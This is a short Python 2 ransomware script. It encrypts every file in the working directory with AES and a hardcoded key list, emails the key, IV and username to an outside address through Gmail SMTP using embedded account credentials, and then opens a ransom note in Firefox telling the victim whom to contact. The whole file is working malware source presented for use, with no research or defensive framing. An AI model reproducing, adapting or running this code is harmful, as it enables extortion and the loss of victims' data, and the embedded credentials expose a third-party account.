#!/usr/bin/env python

import os,sys,time
import smtplib
import random
import hashlib

try:
	from Crypto.Cipher import AES
except:
	  os.system('pip install pycrypto')
	  time.sleep(1)
	  from Crypto.Cipher import AES
	  
from Crypto.Random import random

'''+++++++++++++++++++++++++ GLOBALS DEFINE +++++++++++++++++++++++++'''
global PASSWORD
global IV
global USER

KEYS = ['68b329da9893e340', '4e5dc3caa06fa07c','ba0cc7fbd788f3aa', '6fad925d11791093','93c2f537558d98f8', '7755cd776caa84bc', '41e4d89b2ae8a90f']

seed = str(random.randint(0,35535))
HASH = hashlib.md5(seed)
#IV = HASH.hexdigest()
#IV = str(IV[1:16])
IV = str(random.choice(KEYS))	

seed = str(random.randint(0,35535))
HASH = hashlib.md5(seed)
PASSWORD = HASH.hexdigest()
PASSWORD = str(random.choice(KEYS))	
FILES = []
USER = os.getenv('USER')

'''+++++++++++++++++++++++++ EMAIL FUNCTION +++++++++++++++++++++++++'''
def email_function():
	try: 		
		mailer = smtplib.SMTP('smtp.gmail.com',25)
		mailer.ehlo()
		mailer.starttls()
		mailer.login('foobarnoobr@gmail.com','ghost1aa')
		mailer.sendmail('n00b','mateusdub_@hotmail.com',"Subject: \nPassword %s\nIV %s\nUSER %s" % (PASSWORD,IV,USER))
		time.sleep(1)
		mailer.quit()
	except:
		pass
		
def encrypt():
	os.system('clear||cls')
	print "[!] This should take a long time..."

	bar = AES.new(PASSWORD, AES.MODE_CBC,str(IV))		
	
	'''location = raw_input("Insert the directory: ")

	if location == '':
		print "This field can't be null!"
		sys.exit()'''

	os.chdir('.')
	os.system('[ -f /tmp/h4ck3d.txt ] && rm /tmp/h4ck3d.txt')
	os.system('for x in *; do [ -f "$x" ] && echo $x >> /tmp/h4ck3d.txt; done')

	to_encrypt = open('/tmp/h4ck3d.txt','r')

	for x in to_encrypt.readlines():
		x = x.rstrip()	
		to_read = open("%s" % x, 'r')
		var = open("%s/%s_h4ck3d" % (os.getenv('PWD'),x),'w')		
		
		try:
			for i in to_read.readlines():
				if len(i) < 16:
					dif = 16 - len(i)
					for y in range(dif):
						i += " "
					aux = bar.encrypt(i)
					var.write(str(aux))
					var.write('\n')
					
				elif len(i) > 16: 		 
					 dif = len(i)
					 while dif % 16 != 0:
						   dif += 1																					        			   
										 
					 for y in range(dif-len(i)):
						i += " "		 
					 
					 aux = bar.encrypt(i)
					 var.write(str(aux))
					 var.write('\n')					 
					 
			
			FILES.append(x)	
			var.close()
			to_read.close()			
								
		except:
			#print "[-] Error to encrypt %s" % x
			pass
			
	email_function()	
	time.sleep(2)
	notification()

	
def notification():
	msg = " <!DOCTYPE html>\
	<html>\
	<head>\
	<title>HELLO %s </title>\
	</head>\
	<body>\
	\
	<p>Oops! We've got a little problem here! It seems that we have a ransonware. </p>\
	<p>Talk to: foobarnoobr@gmail.com</p>\
	\
	</body>\
	</html> " % os.getenv('USER')
				
	foo = open("%s/hello.html" % os.getenv('HOME'),'w')
	foo.write(msg)
	foo.close()
	os.system("firefox %s/hello.html" % os.getenv('HOME'))

'''++++++++++++++++++++++++++++++++++ MAIN +++++++++++++++++++++++++++++++++++++++++++++'''
encrypt()
